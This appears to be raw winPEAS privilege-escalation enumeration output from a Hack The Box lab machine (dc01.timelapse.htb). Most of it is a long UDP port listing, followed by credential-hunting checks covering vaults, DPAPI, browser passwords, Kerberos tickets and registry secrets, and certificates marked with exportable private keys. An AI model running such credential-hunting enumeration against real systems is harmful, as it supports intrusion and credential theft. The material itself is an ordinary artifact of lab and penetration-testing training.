  UDP        [::]                                        55298         *:*                            2852              dns
  UDP        [::]                                        55299         *:*                            2852              dns
  UDP        [::]                                        55300         *:*                            2852              dns
  UDP        [::]                                        55301         *:*                            2852              dns
  UDP        [::]                                        55302         *:*                            2852              dns
  UDP        [::]                                        55303         *:*                            2852              dns
  UDP        [::]                                        55304         *:*                            2852              dns
  UDP        [::]                                        55305         *:*                            2852              dns
  UDP        [::]                                        55306         *:*                            2852              dns
  UDP        [::]                                        55307         *:*                            2852              dns
  UDP        [::]                                        55308         *:*                            2852              dns
  UDP        [::]                                        55309         *:*                            2852              dns
  UDP        [::]                                        55310         *:*                            2852              dns
  UDP        [::]                                        55311         *:*                            2852              dns
  UDP        [::]                                        55312         *:*                            2852              dns
  UDP        [::]                                        55313         *:*                            2852              dns
  UDP        [::]                                        55314         *:*                            2852              dns
  UDP        [::]                                        55315         *:*                            2852              dns
  UDP        [::]                                        55316         *:*                            2852              dns
  UDP        [::]                                        55317         *:*                            2852              dns
  UDP        [::]                                        55318         *:*                            2852              dns
  UDP        [::]                                        55319         *:*                            2852              dns
  UDP        [::]                                        55320         *:*                            2852              dns
  UDP        [::]                                        55321         *:*                            2852              dns
  UDP        [::]                                        55322         *:*                            2852              dns
  UDP        [::]                                        55323         *:*                            2852              dns
  UDP        [::]                                        55324         *:*                            2852              dns
  UDP        [::]                                        55325         *:*                            2852              dns
  UDP        [::]                                        55326         *:*                            2852              dns
  UDP        [::]                                        55327         *:*                            2852              dns
  UDP        [::]                                        55328         *:*                            2852              dns
  UDP        [::]                                        55329         *:*                            2852              dns
  UDP        [::]                                        55330         *:*                            2852              dns
  UDP        [::]                                        55331         *:*                            2852              dns
  UDP        [::]                                        55332         *:*                            2852              dns
  UDP        [::]                                        55333         *:*                            2852              dns
  UDP        [::]                                        55334         *:*                            2852              dns
  UDP        [::]                                        55335         *:*                            2852              dns
  UDP        [::]                                        55336         *:*                            2852              dns
  UDP        [::]                                        55337         *:*                            2852              dns
  UDP        [::]                                        55338         *:*                            2852              dns
  UDP        [::]                                        55339         *:*                            2852              dns
  UDP        [::]                                        55340         *:*                            2852              dns
  UDP        [::]                                        55341         *:*                            2852              dns
  UDP        [::]                                        55342         *:*                            2852              dns
  UDP        [::]                                        55343         *:*                            2852              dns
  UDP        [::]                                        55344         *:*                            2852              dns
  UDP        [::]                                        55345         *:*                            2852              dns
  UDP        [::]                                        55346         *:*                            2852              dns
  UDP        [::]                                        55347         *:*                            2852              dns
  UDP        [::]                                        55348         *:*                            2852              dns
  UDP        [::]                                        55349         *:*                            2852              dns
  UDP        [::]                                        55350         *:*                            2852              dns
  UDP        [::]                                        55351         *:*                            2852              dns
  UDP        [::]                                        55352         *:*                            2852              dns
  UDP        [::]                                        55353         *:*                            2852              dns
  UDP        [::]                                        55354         *:*                            2852              dns
  UDP        [::]                                        55355         *:*                            2852              dns
  UDP        [::]                                        55356         *:*                            2852              dns
  UDP        [::]                                        55357         *:*                            2852              dns
  UDP        [::]                                        55358         *:*                            2852              dns
  UDP        [::]                                        55359         *:*                            2852              dns
  UDP        [::]                                        55360         *:*                            2852              dns
  UDP        [::]                                        55361         *:*                            2852              dns
  UDP        [::]                                        55362         *:*                            2852              dns
  UDP        [::]                                        55363         *:*                            2852              dns
  UDP        [::]                                        55364         *:*                            2852              dns
  UDP        [::]                                        55365         *:*                            2852              dns
  UDP        [::]                                        55366         *:*                            2852              dns
  UDP        [::]                                        55367         *:*                            2852              dns
  UDP        [::]                                        55368         *:*                            2852              dns
  UDP        [::]                                        55369         *:*                            2852              dns
  UDP        [::]                                        55370         *:*                            2852              dns
  UDP        [::]                                        55371         *:*                            2852              dns
  UDP        [::]                                        55372         *:*                            2852              dns
  UDP        [::]                                        55373         *:*                            2852              dns
  UDP        [::]                                        55374         *:*                            2852              dns
  UDP        [::]                                        55375         *:*                            2852              dns
  UDP        [::]                                        55376         *:*                            2852              dns
  UDP        [::]                                        55377         *:*                            2852              dns
  UDP        [::]                                        55378         *:*                            2852              dns
  UDP        [::]                                        55379         *:*                            2852              dns
  UDP        [::]                                        55383         *:*                            2852              dns
  UDP        [::]                                        63889         *:*                            1188              svchost
  UDP        [::]                                        65060         *:*                            2852              dns
  UDP        [::]                                        65061         *:*                            2852              dns
  UDP        [::]                                        65062         *:*                            2852              dns
  UDP        [::]                                        65063         *:*                            2852              dns
  UDP        [::]                                        65064         *:*                            2852              dns
  UDP        [::]                                        65065         *:*                            2852              dns
  UDP        [::]                                        65066         *:*                            2852              dns
  UDP        [::]                                        65067         *:*                            2852              dns
  UDP        [::]                                        65068         *:*                            2852              dns
  UDP        [::]                                        65069         *:*                            2852              dns
  UDP        [::]                                        65070         *:*                            2852              dns
  UDP        [::]                                        65071         *:*                            2852              dns
  UDP        [::]                                        65072         *:*                            2852              dns
  UDP        [::]                                        65073         *:*                            2852              dns
  UDP        [::]                                        65074         *:*                            2852              dns
  UDP        [::]                                        65075         *:*                            2852              dns
  UDP        [::]                                        65076         *:*                            2852              dns
  UDP        [::]                                        65077         *:*                            2852              dns
  UDP        [::]                                        65078         *:*                            2852              dns
  UDP        [::]                                        65079         *:*                            2852              dns
  UDP        [::]                                        65080         *:*                            2852              dns
  UDP        [::]                                        65081         *:*                            2852              dns
  UDP        [::]                                        65082         *:*                            2852              dns
  UDP        [::]                                        65083         *:*                            2852              dns
  UDP        [::]                                        65084         *:*                            2852              dns
  UDP        [::]                                        65085         *:*                            2852              dns
  UDP        [::]                                        65086         *:*                            2852              dns
  UDP        [::]                                        65087         *:*                            2852              dns
  UDP        [::]                                        65088         *:*                            2852              dns
  UDP        [::]                                        65089         *:*                            2852              dns
  UDP        [::]                                        65090         *:*                            2852              dns
  UDP        [::]                                        65091         *:*                            2852              dns
  UDP        [::]                                        65092         *:*                            2852              dns
  UDP        [::]                                        65093         *:*                            2852              dns
  UDP        [::]                                        65094         *:*                            2852              dns
  UDP        [::]                                        65095         *:*                            2852              dns
  UDP        [::]                                        65096         *:*                            2852              dns
  UDP        [::]                                        65097         *:*                            2852              dns
  UDP        [::]                                        65098         *:*                            2852              dns
  UDP        [::]                                        65099         *:*                            2852              dns
  UDP        [::]                                        65100         *:*                            2852              dns
  UDP        [::]                                        65101         *:*                            2852              dns
  UDP        [::]                                        65102         *:*                            2852              dns
  UDP        [::]                                        65103         *:*                            2852              dns
  UDP        [::]                                        65104         *:*                            2852              dns
  UDP        [::]                                        65105         *:*                            2852              dns
  UDP        [::]                                        65106         *:*                            2852              dns
  UDP        [::]                                        65107         *:*                            2852              dns
  UDP        [::]                                        65108         *:*                            2852              dns
  UDP        [::]                                        65109         *:*                            2852              dns
  UDP        [::]                                        65110         *:*                            2852              dns
  UDP        [::]                                        65111         *:*                            2852              dns
  UDP        [::]                                        65112         *:*                            2852              dns
  UDP        [::]                                        65113         *:*                            2852              dns
  UDP        [::]                                        65114         *:*                            2852              dns
  UDP        [::]                                        65115         *:*                            2852              dns
  UDP        [::]                                        65116         *:*                            2852              dns
  UDP        [::]                                        65117         *:*                            2852              dns
  UDP        [::]                                        65118         *:*                            2852              dns
  UDP        [::]                                        65119         *:*                            2852              dns
  UDP        [::]                                        65120         *:*                            2852              dns
  UDP        [::]                                        65121         *:*                            2852              dns
  UDP        [::]                                        65122         *:*                            2852              dns
  UDP        [::]                                        65123         *:*                            2852              dns
  UDP        [::]                                        65124         *:*                            2852              dns
  UDP        [::]                                        65125         *:*                            2852              dns
  UDP        [::]                                        65126         *:*                            2852              dns
  UDP        [::]                                        65127         *:*                            2852              dns
  UDP        [::]                                        65128         *:*                            2852              dns
  UDP        [::]                                        65129         *:*                            2852              dns
  UDP        [::]                                        65130         *:*                            2852              dns
  UDP        [::]                                        65131         *:*                            2852              dns
  UDP        [::]                                        65132         *:*                            2852              dns
  UDP        [::]                                        65133         *:*                            2852              dns
  UDP        [::]                                        65134         *:*                            2852              dns
  UDP        [::]                                        65135         *:*                            2852              dns
  UDP        [::]                                        65136         *:*                            2852              dns
  UDP        [::]                                        65137         *:*                            2852              dns
  UDP        [::]                                        65138         *:*                            2852              dns
  UDP        [::]                                        65139         *:*                            2852              dns
  UDP        [::]                                        65140         *:*                            2852              dns
  UDP        [::]                                        65141         *:*                            2852              dns
  UDP        [::]                                        65142         *:*                            2852              dns
  UDP        [::]                                        65143         *:*                            2852              dns
  UDP        [::]                                        65144         *:*                            2852              dns
  UDP        [::]                                        65145         *:*                            2852              dns
  UDP        [::]                                        65146         *:*                            2852              dns
  UDP        [::]                                        65147         *:*                            2852              dns
  UDP        [::]                                        65148         *:*                            2852              dns
  UDP        [::]                                        65149         *:*                            2852              dns
  UDP        [::]                                        65150         *:*                            2852              dns
  UDP        [::]                                        65151         *:*                            2852              dns
  UDP        [::]                                        65152         *:*                            2852              dns
  UDP        [::]                                        65153         *:*                            2852              dns
  UDP        [::]                                        65154         *:*                            2852              dns
  UDP        [::]                                        65155         *:*                            2852              dns
  UDP        [::]                                        65156         *:*                            2852              dns
  UDP        [::]                                        65157         *:*                            2852              dns
  UDP        [::]                                        65158         *:*                            2852              dns
  UDP        [::]                                        65159         *:*                            2852              dns
  UDP        [::]                                        65160         *:*                            2852              dns
  UDP        [::]                                        65161         *:*                            2852              dns
  UDP        [::]                                        65162         *:*                            2852              dns
  UDP        [::]                                        65163         *:*                            2852              dns
  UDP        [::]                                        65164         *:*                            2852              dns
  UDP        [::]                                        65165         *:*                            2852              dns
  UDP        [::]                                        65166         *:*                            2852              dns
  UDP        [::]                                        65167         *:*                            2852              dns
  UDP        [::]                                        65168         *:*                            2852              dns
  UDP        [::]                                        65169         *:*                            2852              dns
  UDP        [::]                                        65170         *:*                            2852              dns
  UDP        [::]                                        65171         *:*                            2852              dns
  UDP        [::]                                        65172         *:*                            2852              dns
  UDP        [::]                                        65173         *:*                            2852              dns
  UDP        [::]                                        65174         *:*                            2852              dns
  UDP        [::]                                        65175         *:*                            2852              dns
  UDP        [::]                                        65176         *:*                            2852              dns
  UDP        [::]                                        65177         *:*                            2852              dns
  UDP        [::]                                        65178         *:*                            2852              dns
  UDP        [::]                                        65179         *:*                            2852              dns
  UDP        [::]                                        65180         *:*                            2852              dns
  UDP        [::]                                        65181         *:*                            2852              dns
  UDP        [::]                                        65182         *:*                            2852              dns
  UDP        [::]                                        65183         *:*                            2852              dns
  UDP        [::]                                        65184         *:*                            2852              dns
  UDP        [::]                                        65185         *:*                            2852              dns
  UDP        [::]                                        65186         *:*                            2852              dns
  UDP        [::]                                        65187         *:*                            2852              dns
  UDP        [::]                                        65188         *:*                            2852              dns
  UDP        [::]                                        65189         *:*                            2852              dns
  UDP        [::]                                        65190         *:*                            2852              dns
  UDP        [::]                                        65191         *:*                            2852              dns
  UDP        [::]                                        65192         *:*                            2852              dns
  UDP        [::]                                        65193         *:*                            2852              dns
  UDP        [::]                                        65194         *:*                            2852              dns
  UDP        [::]                                        65195         *:*                            2852              dns
  UDP        [::]                                        65196         *:*                            2852              dns
  UDP        [::]                                        65197         *:*                            2852              dns
  UDP        [::]                                        65198         *:*                            2852              dns
  UDP        [::]                                        65199         *:*                            2852              dns
  UDP        [::]                                        65200         *:*                            2852              dns
  UDP        [::]                                        65201         *:*                            2852              dns
  UDP        [::]                                        65202         *:*                            2852              dns
  UDP        [::]                                        65203         *:*                            2852              dns
  UDP        [::]                                        65204         *:*                            2852              dns
  UDP        [::]                                        65205         *:*                            2852              dns
  UDP        [::]                                        65206         *:*                            2852              dns
  UDP        [::]                                        65207         *:*                            2852              dns
  UDP        [::]                                        65208         *:*                            2852              dns
  UDP        [::]                                        65209         *:*                            2852              dns
  UDP        [::]                                        65210         *:*                            2852              dns
  UDP        [::]                                        65211         *:*                            2852              dns
  UDP        [::]                                        65212         *:*                            2852              dns
  UDP        [::]                                        65213         *:*                            2852              dns
  UDP        [::]                                        65214         *:*                            2852              dns
  UDP        [::]                                        65215         *:*                            2852              dns
  UDP        [::]                                        65216         *:*                            2852              dns
  UDP        [::]                                        65217         *:*                            2852              dns
  UDP        [::]                                        65218         *:*                            2852              dns
  UDP        [::]                                        65219         *:*                            2852              dns
  UDP        [::]                                        65220         *:*                            2852              dns
  UDP        [::]                                        65221         *:*                            2852              dns
  UDP        [::]                                        65222         *:*                            2852              dns
  UDP        [::]                                        65223         *:*                            2852              dns
  UDP        [::]                                        65224         *:*                            2852              dns
  UDP        [::]                                        65225         *:*                            2852              dns
  UDP        [::]                                        65226         *:*                            2852              dns
  UDP        [::]                                        65227         *:*                            2852              dns
  UDP        [::]                                        65228         *:*                            2852              dns
  UDP        [::]                                        65229         *:*                            2852              dns
  UDP        [::]                                        65230         *:*                            2852              dns
  UDP        [::]                                        65231         *:*                            2852              dns
  UDP        [::]                                        65232         *:*                            2852              dns
  UDP        [::]                                        65233         *:*                            2852              dns
  UDP        [::]                                        65234         *:*                            2852              dns
  UDP        [::]                                        65235         *:*                            2852              dns
  UDP        [::]                                        65236         *:*                            2852              dns
  UDP        [::]                                        65237         *:*                            2852              dns
  UDP        [::]                                        65238         *:*                            2852              dns
  UDP        [::]                                        65239         *:*                            2852              dns
  UDP        [::]                                        65240         *:*                            2852              dns
  UDP        [::]                                        65241         *:*                            2852              dns
  UDP        [::]                                        65242         *:*                            2852              dns
  UDP        [::]                                        65243         *:*                            2852              dns
  UDP        [::]                                        65244         *:*                            2852              dns
  UDP        [::]                                        65245         *:*                            2852              dns
  UDP        [::]                                        65246         *:*                            2852              dns
  UDP        [::]                                        65247         *:*                            2852              dns
  UDP        [::]                                        65248         *:*                            2852              dns
  UDP        [::]                                        65249         *:*                            2852              dns
  UDP        [::]                                        65250         *:*                            2852              dns
  UDP        [::]                                        65251         *:*                            2852              dns
  UDP        [::]                                        65252         *:*                            2852              dns
  UDP        [::]                                        65253         *:*                            2852              dns
  UDP        [::]                                        65254         *:*                            2852              dns
  UDP        [::]                                        65255         *:*                            2852              dns
  UDP        [::]                                        65256         *:*                            2852              dns
  UDP        [::]                                        65257         *:*                            2852              dns
  UDP        [::]                                        65258         *:*                            2852              dns
  UDP        [::]                                        65259         *:*                            2852              dns
  UDP        [::]                                        65260         *:*                            2852              dns
  UDP        [::]                                        65261         *:*                            2852              dns
  UDP        [::]                                        65262         *:*                            2852              dns
  UDP        [::]                                        65263         *:*                            2852              dns
  UDP        [::]                                        65264         *:*                            2852              dns
  UDP        [::]                                        65265         *:*                            2852              dns
  UDP        [::]                                        65266         *:*                            2852              dns
  UDP        [::]                                        65267         *:*                            2852              dns
  UDP        [::]                                        65268         *:*                            2852              dns
  UDP        [::]                                        65269         *:*                            2852              dns
  UDP        [::]                                        65270         *:*                            2852              dns
  UDP        [::]                                        65271         *:*                            2852              dns
  UDP        [::]                                        65272         *:*                            2852              dns
  UDP        [::]                                        65273         *:*                            2852              dns
  UDP        [::]                                        65274         *:*                            2852              dns
  UDP        [::]                                        65275         *:*                            2852              dns
  UDP        [::]                                        65276         *:*                            2852              dns
  UDP        [::]                                        65277         *:*                            2852              dns
  UDP        [::]                                        65278         *:*                            2852              dns
  UDP        [::]                                        65279         *:*                            2852              dns
  UDP        [::]                                        65280         *:*                            2852              dns
  UDP        [::]                                        65281         *:*                            2852              dns
  UDP        [::]                                        65282         *:*                            2852              dns
  UDP        [::]                                        65283         *:*                            2852              dns
  UDP        [::]                                        65284         *:*                            2852              dns
  UDP        [::]                                        65285         *:*                            2852              dns
  UDP        [::]                                        65286         *:*                            2852              dns
  UDP        [::]                                        65287         *:*                            2852              dns
  UDP        [::]                                        65288         *:*                            2852              dns
  UDP        [::]                                        65289         *:*                            2852              dns
  UDP        [::]                                        65290         *:*                            2852              dns
  UDP        [::]                                        65291         *:*                            2852              dns
  UDP        [::]                                        65292         *:*                            2852              dns
  UDP        [::]                                        65293         *:*                            2852              dns
  UDP        [::]                                        65294         *:*                            2852              dns
  UDP        [::]                                        65295         *:*                            2852              dns
  UDP        [::]                                        65296         *:*                            2852              dns
  UDP        [::]                                        65297         *:*                            2852              dns
  UDP        [::]                                        65298         *:*                            2852              dns
  UDP        [::]                                        65299         *:*                            2852              dns
  UDP        [::]                                        65300         *:*                            2852              dns
  UDP        [::]                                        65301         *:*                            2852              dns
  UDP        [::]                                        65302         *:*                            2852              dns
  UDP        [::]                                        65303         *:*                            2852              dns
  UDP        [::]                                        65304         *:*                            2852              dns
  UDP        [::]                                        65305         *:*                            2852              dns
  UDP        [::]                                        65306         *:*                            2852              dns
  UDP        [::]                                        65307         *:*                            2852              dns
  UDP        [::]                                        65308         *:*                            2852              dns
  UDP        [::]                                        65309         *:*                            2852              dns
  UDP        [::]                                        65310         *:*                            2852              dns
  UDP        [::]                                        65311         *:*                            2852              dns
  UDP        [::]                                        65312         *:*                            2852              dns
  UDP        [::]                                        65313         *:*                            2852              dns
  UDP        [::]                                        65314         *:*                            2852              dns
  UDP        [::]                                        65315         *:*                            2852              dns
  UDP        [::]                                        65316         *:*                            2852              dns
  UDP        [::]                                        65317         *:*                            2852              dns
  UDP        [::]                                        65318         *:*                            2852              dns
  UDP        [::]                                        65319         *:*                            2852              dns
  UDP        [::]                                        65320         *:*                            2852              dns
  UDP        [::]                                        65321         *:*                            2852              dns
  UDP        [::]                                        65322         *:*                            2852              dns
  UDP        [::]                                        65323         *:*                            2852              dns
  UDP        [::]                                        65324         *:*                            2852              dns
  UDP        [::1]                                       53            *:*                            2852              dns
  UDP        [::1]                                       50641         *:*                            2852              dns
  UDP        [dead:beef::19a]                            53            *:*                            2852              dns
  UDP        [dead:beef::19a]                            88            *:*                            660               lsass
  UDP        [dead:beef::19a]                            464           *:*                            660               lsass
  UDP        [dead:beef::c52d:87a8:19e0:16c9]            53            *:*                            2852              dns
  UDP        [dead:beef::c52d:87a8:19e0:16c9]            88            *:*                            660               lsass
  UDP        [dead:beef::c52d:87a8:19e0:16c9]            464           *:*                            660               lsass
  UDP        [fe80::c52d:87a8:19e0:16c9%13]              53            *:*                            2852              dns
  UDP        [fe80::c52d:87a8:19e0:16c9%13]              88            *:*                            660               lsass
  UDP        [fe80::c52d:87a8:19e0:16c9%13]              464           *:*                            660               lsass

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps                                                                                                                                                  
  No URLs configured

  Zone Auth Settings                                                                                                                                         
  No Zone Auth Settings


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run:
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :
    Block Clipboard Redirection             :
    Block COM Port Redirection              :
    Block Drive Redirection                 :
    Block LPT Port Redirection              :
    Block PnP Device Redirection            :
    Block Printer Redirection               :
    Allow Smart Card Redirection            :

  RDP Client Settings                                                                                                                                        
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager                                                                                                                                                        
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001006000000000000000610000000000000058000000000000005800000008000800580000000000000061000000058a80a20a0063450000000f14fc3fbcab68c3ff59fc5158dd792d02440043003000310000                                                         


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)                                                                                                                                                  
   --- End of inner exception stack trace ---                                                                                                                
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                                                                                          
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                                                                              
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                                                                    
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry                                                                                                                                             
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.
                                                                                                                                                             
    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-671920749-559770252-3318990721-1603
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files
                                                                                                                                                             

ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files
                                                                                                                                                             

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
                                                                                                                                                             
  Issuer             : CN=Legacyy
  Subject            : CN=Legacyy
  ValidDate          : 10/25/2021 7:05:52 AM
  ExpiryDate         : 10/25/2031 7:15:52 AM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : D0D286AE3B8DFB779834ADAB23EB21E66F7B7ADE

  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
   =================================================================================================

  Issuer             : CN=dc01.timelapse.htb
  Subject            : CN=dc01.timelapse.htb
  ValidDate          : 10/25/2021 7:05:29 AM
  ExpiryDate         : 10/25/2022 7:25:29 AM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : 5861ACF776B8703FD01EE25DFC7C9952A4477652

  Enhanced Key Usages
       Server Authentication
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50
                                                                                                                                                             
  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

